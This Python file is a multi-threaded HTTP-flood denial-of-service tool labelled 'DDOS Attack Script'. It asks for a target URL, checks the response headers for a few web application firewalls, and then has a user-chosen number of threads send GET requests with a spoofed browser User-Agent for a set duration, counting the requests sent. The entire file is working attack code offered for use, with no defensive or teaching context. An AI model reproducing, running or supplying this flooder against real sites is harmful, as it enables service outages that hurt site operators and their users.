import requests
import time
import threading
import sys

stop_event = threading.Event()

def detect_waf(target_url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    }
    try:
        response = requests.get(target_url, headers=headers, timeout=10)
        if 'Server' in response.headers and any(waf in response.headers['Server'] for waf in ['Cloudflare', 'Incapsula', 'ModSecurity']):
            print('\n\033[93mWAF Detected!\033[0m')
        else:
            print('\nNo WAF Detected.')
    except requests.exceptions.RequestException as e:
        print('\n\033[91mError occurred while detecting WAF:\033[0m', str(e))
    except requests.exceptions.Timeout:
        print('\nNo WAF Detected. Proceeding with the attack.')

def handler():
    print("\n\033[93mTime is up!\033[0m")
    print("Stopping the attack...")
    stop_event.set()  # Set the event to stop the attack loop

def send_packet(target_url, request_counter):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    }
    try:
        while not stop_event.is_set():  # Check if the event is set to stop the attack loop
            response = requests.get(target_url, headers=headers)
            request_counter.increment()  # Increment the request counter
    except requests.exceptions.RequestException as e:
        print('\n\033[91mError occurred while sending packet:\033[0m', str(e))
    finally:
        stop_event.set()  # Set the event to stop the attack loop in case of any exception

class RequestCounter:
    def __init__(self):
        self.count = 0
        self.lock = threading.Lock()

    def increment(self):
        with self.lock:
            self.count += 1

    def get_count(self):
        with self.lock:
            return self.count

def attack(target_url, request_counter):
    send_packet(target_url, request_counter)

def main():
    print("=======================================")
    print("        \033[95mDDOS Attack Script\033[0m")
    print("=======================================")
    try:
        target_url = input('\nEnter the target URL (including the scheme, e.g., http://example.com): ')
        print("\n\033[96mDetecting WAF...\033[0m")
        detect_waf(target_url)
        print("=======================================\n")

        num_threads = int(input('Number of Threads: '))
        attack_duration = int(input('Duration of Attack (seconds): '))

        print("\n\033[92mStarting the attack...\033[0m")
        request_counter = RequestCounter()
        threads = []
        for _ in range(num_threads):
            t = threading.Thread(target=attack, args=(target_url, request_counter))
            threads.append(t)
            t.start()

        print("\n\033[93mAttack in progress...\033[0m")
        print("=======================================\n")

        # Set up the timer to stop the attack after the specified duration
        timer = threading.Timer(attack_duration, handler)
        timer.start()

        # Wait for the timer to expire or the attack to finish
        while not stop_event.is_set() and any(t.is_alive() for t in threads):
            time.sleep(1)

        # Stop the attack loop
        stop_event.set()

        # Wait for all threads to finish
        for t in threads:
            t.join()

        # Cancel the timer
        timer.cancel()

        total_requests = request_counter.get_count()
        print("\nTotal Requests Sent:", total_requests)
        print("\n\033[92mAttack finished!\033[0m")
        print("\nMain thread exiting...")

    except ValueError:
        print('\n\033[91mInvalid input! Please enter a valid number.\033[0m')
    except KeyboardInterrupt:
        print('\n\n\033[93mKeyboard interrupt received. Stopping the attack...\033[0m')
        stop_event.set()  # Set the event to stop the attack loop
        for t in threads:
            t.join()
        print('\n\033[93mDDOS Attack stopped!\033[0m')
    except Exception as e:
        print('\n\033[91mAn error occurred:\033[0m', str(e))

if __name__ == '__main__':
    main()
